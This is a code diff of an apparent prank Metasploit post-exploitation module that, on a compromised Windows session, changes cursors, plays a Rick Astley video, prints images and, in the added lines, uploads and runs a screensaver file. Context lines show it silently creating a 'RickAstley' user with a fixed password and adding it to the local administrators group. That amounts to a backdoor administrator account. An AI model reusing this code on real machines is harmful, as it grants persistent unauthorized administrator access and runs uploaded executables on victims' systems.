@@ -28,10 +28,11 @@ class Metasploit3 < Msf::Post
 		if datastore["COMMAND"].eql? "cursor"
 			make_rick_astley_cursor
 		elsif datastore["COMMAND"].eql? "video"
-			print_status("Launching Rick Roll Video")
 			launch_video
 		elsif datastore["COMMAND"].eql? "printer"
 			print_rick_to_default_printer
+		elsif datastore["COMMAND"].eql? "screensaver"
+			install_screensaver	
 		else
 			# do this by default for now
 			#make_rick_astley_cursor
@@ -84,6 +85,7 @@ class Metasploit3 < Msf::Post
 		begin
 			session.sys.process.execute("net user RickAstley nevagonnagive /add", nil, {'Hidden' => true})
 			session.sys.process.execute("net localgroup administrators RickAstley /add", nil, {'Hidden' => true})
+			print_status "Rick Astley has been added as an administrative user!"
 		rescue::Exception => e
 			print_status("The following Error was encountered: #{e.class} #{e}")
 		end
@@ -98,11 +100,27 @@ class Metasploit3 < Msf::Post
 		mediaplayer = "\"C:\\Program Files\\Windows Media Player\\wmplayer.exe\""
 		
 		tempdir = client.fs.file.expand_path("%TEMP%")
-		temp_video = tempdir + "\\" +  Rex::Text.rand_text_alpha((rand(8)+6)) + ".avi"
+		temp_video = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".avi"
 		print_status "Uploading to => " + temp_video
 		session.fs.file.upload_file("#{temp_video}", rick_avi)
 
 		session.sys.process.execute("#{mediaplayer} \"#{temp_video}\"", nil, {'Hidden' => false})
+		print_status "Video launch completed!"
+	end
+	
+	def install_screensaver
+		print_status "Starting a Screensaver of Rick Astley"
+		path = ::File.join(Msf::Config.install_root, "data", "post")
+                rick_scr_filename = "rick.scr"
+                rick_scr = ::File.join(path, rick_scr_filename)
+
+                tempdir = client.fs.file.expand_path("%TEMP%")
+                temp_scr = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) +".scr"
+                print_status "uploading to => " + temp_scr
+                session.fs.file.upload_file("#{temp_scr}", rick_scr)
+			
+		session.sys.process.execute("cmd.exe /c \"#{temp_scr}\" /s", nil, {'Hidden' => false})
+		print_status "Screensaver execution completed!"
 	end
 	
 	def print_rick_to_default_printer
@@ -117,5 +135,6 @@ class Metasploit3 < Msf::Post
 
 		print_status("Printing rick out to the default printer")
 		session.sys.process.execute("cmd.exe /c mspaint.exe /pt \"#{temp_picture}\"", nil, {'Hidden' => true})
+		print_status("Print execution completed!")
 	end
 end
